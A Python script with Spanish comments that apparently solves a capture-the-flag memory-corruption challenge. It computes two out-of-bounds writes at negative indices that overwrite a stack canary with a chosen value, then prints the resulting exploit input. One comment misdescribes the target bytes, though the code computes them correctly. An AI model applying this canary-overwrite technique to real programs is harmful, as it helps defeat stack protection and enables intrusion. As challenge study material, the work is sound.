#!/usr/bin/env python3

# El canario está en offset 15-22 (8 bytes)
# Target: 0xb000000b5

# Escrituras posibles:
# num1=-7: offset 0-7 (no toca canario)
# num1=-6: offset 8-15 (toca byte 15 del canario)
# num1=-5: offset 16-23 (toca bytes 16-22 del canario)

# El canario se lee como qword en offset 15
# bytes 15-22 en little endian

target = 0xb000000b5
target_bytes = list(target.to_bytes(8, 'little'))
print(f"Target canario: 0x{target:016x}")
print(f"Target bytes (15-22): {' '.join(f'{b:02x}' for b in target_bytes)}")
print()

# Estrategia: escribir con -6 y -5
# Write con -6 en offset 8-15:
#   bytes 8-15 se escriben
#   byte 15 del canario = byte 7 del qword escrito

# Write con -5 en offset 16-23:
#   bytes 16-23 se escriben
#   bytes 16-22 del canario = bytes 0-6 del qword escrito

# Entonces:
# - Con -6 controlamos byte 15 (índice 0 del target)
# - Con -5 controlamos bytes 16-22 (índices 1-7 del target)

# Para byte 15 = 0xb5:
# Necesitamos qword con byte 7 = 0xb5
# Los bytes 8-14 deben ser valores que NO crasheen el programa

# Hipótesis: bytes 8-14 deben ser CERO para no crashear
# Entonces escribimos: 0x00b5000000000000 (little endian: 00 00 00 00 00 00 b5 00)
# NO! Eso pondría 0x00 en byte 15

# Little endian de qword V:
# byte 0 (offset 8) = V & 0xff
# byte 1 (offset 9) = (V >> 8) & 0xff
# ...
# byte 7 (offset 15) = (V >> 56) & 0xff

# Para byte 15 = 0xb5:
# (V >> 56) = 0xb5
# V = 0xb5 << 56 = 0xb500000000000000

write1_val = 0xb5 << 56
print(f"Write 1 (num1=-6, offset 8-15):")
print(f"  Valor: {write1_val} = 0x{write1_val:016x}")
print(f"  Bytes: {' '.join(f'{b:02x}' for b in write1_val.to_bytes(8, 'little'))}")
print(f"  Byte 15 (último) = 0x{(write1_val >> 56):02x}")
print()

# Para bytes 16-22 = target_bytes[1:8]:
# Escribimos qword en offset 16
# byte 0 (offset 16) = target_bytes[1] = 0x00
# byte 1 (offset 17) = target_bytes[2] = 0x00
# ...
# byte 6 (offset 22) = target_bytes[7] = 0x00
# byte 7 (offset 23) = ??? (no importa)

# Construimos el qword:
write2_bytes = target_bytes[1:8] + [0]  # agregamos un byte extra para completar 8
write2_val = int.from_bytes(write2_bytes, 'little')
print(f"Write 2 (num1=-5, offset 16-23):")
print(f"  Valor: {write2_val} = 0x{write2_val:016x}")
print(f"  Bytes: {' '.join(f'{b:02x}' for b in write2_val.to_bytes(8, 'little'))}")
print(f"  Bytes 16-22 = {' '.join(f'{b:02x}' for b in write2_bytes[:7])}")
print()

# Verificamos el canario resultante:
canary_bytes = bytearray(8)
# Byte 15 (índice 0) viene de write1
canary_bytes[0] = (write1_val >> 56) & 0xff
# Bytes 16-22 (índices 1-7) vienen de write2
for i in range(7):
    canary_bytes[i+1] = write2_bytes[i]

canary_result = int.from_bytes(canary_bytes, 'little')
print(f"Canario resultante: 0x{canary_result:016x}")
print(f"Target:             0x{target:016x}")
print(f"Match: {canary_result == target}")
print()

if canary_result == target:
    print("=== PAYLOAD ===")
    # num2 + num3 = write_val
    # Usamos num2 = 1, num3 = write_val - 1
    print(f"-6 1 {write1_val - 1}")
    print(f"-5 1 {write2_val - 1}")
    print("0 0")
else:
    print("ERROR: No coincide!")